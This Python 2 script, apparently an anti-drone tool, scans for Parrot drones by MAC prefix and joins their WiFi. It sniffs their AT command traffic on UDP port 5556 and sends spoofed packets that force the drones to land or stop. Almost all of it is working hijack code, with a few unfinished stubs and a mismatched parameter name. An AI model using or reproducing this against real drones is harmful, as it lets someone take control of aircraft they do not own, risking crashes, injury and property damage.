from scapy.all import *
from wifi import Cell, Scheme
from time import sleep
import re

def readConfig(): #TODO implement it
	return ("", "")

def readKnobState(): #TODO implement it
	return "Aggressive"

#def scanAndConnectToParrot(interface, whitelist): #TODO change to separate scan & connect
#	parrotNotFound = True
#	while parrotNotFound:
#		aps = Cell.all(interface)
#		print aps
#		for ap in aps:
#			if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
#				print "Parrot Wifi found"
#				print ap
#				parrotNotFound = False
#				scheme = Scheme.for_cell(interface, 'abcde', ap)
#				scheme.delete() #otherwise "This scheme already exists" error
#				scheme.save()
#				scheme.activate() #connect to the Parrot's wifi
#				print "Connected to Parrot Wifi"
#				break
#		sleep(1)

def scanForParrots(interface, whitelist, underattack):
	aps = Cell.all(interface)
	parrots = []
	for ap in aps:
		if ap.address.startswith('90:03:B7') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
				print "New parrot wifi found:", ap.ssid
				parrots.append(ap)
	return parrots

def connectTo(ap, interface):
	try:
		scheme = Scheme.for_cell(interface, ap.ssid, ap)
		scheme.delete() #otherwise "This scheme already exists" error
		scheme.save()
		scheme.activate() #connect to the Parrot's wifi
		return True
	except Exception as detail:
		print "Error while trying to connect to wifi in function connectTo - ", detail
		return False

def getWifiStrength(interface):
	aps = Cell.all(interface) #aps first element is always the one we are connected to right now
	return aps[0].signal #a negative number, closer to 0 - closer the AP

def disconnectFromWifi(interface):
	#apparently python's wifi module can not disconnect from a network
	return True

def getAPsMAC(aps):
	macs = []
	for ap in aps:
		macs.append(ap.address)
	return macs

srcMAC= ""
dstMAC= ""
srcIP = ""
dstIP = ""
seqNr = ""
def sniffParrotCommunication(interface):
	sniff(iface=interface, prn=pkt_callback, filter="udp and port 5556", count = 10, timeout = 1)
	return (srcMAC, dstMAC, srcIP, dstIP, seqNr)

def pkt_callback(pkt):
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	#pkt.show() # debug
	if Raw in pkt and 'AT*' in pkt[Raw].load and srcMAC == "":
		srcMAC= pkt[Ether].src
		dstMAC= pkt[Ether].dst
		srcIP = pkt[IP].src
		dstIP = pkt[IP].dst
		#parse the sequence number
		p = re.compile("=(\d+),")
		m = p.search(pkt[Raw].load)
		seqNr = int(m.group(1))

def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, seqNR, count): #TODO implement warn
	part1 = ""
	part2 = ""
	if command == "land":
		part1 = "REF"
		part2 = "290717696"
	elif command == "stop":
		part1 = "PCMD_MAG"
		part2 = "0,0,0,0,0,0,0"
	elif command == "release":
		part1 = "PCMD_MAG"
		part2 = "0,0,0,0,0,0,0"
		seqNr = -1000000 #so it will be 1 in the end
		count = 1
	
	for i in range(1, count):
		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
		print payload
		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
		sendp(spoofed_packet, iface=interface)
		sleep(0.3)

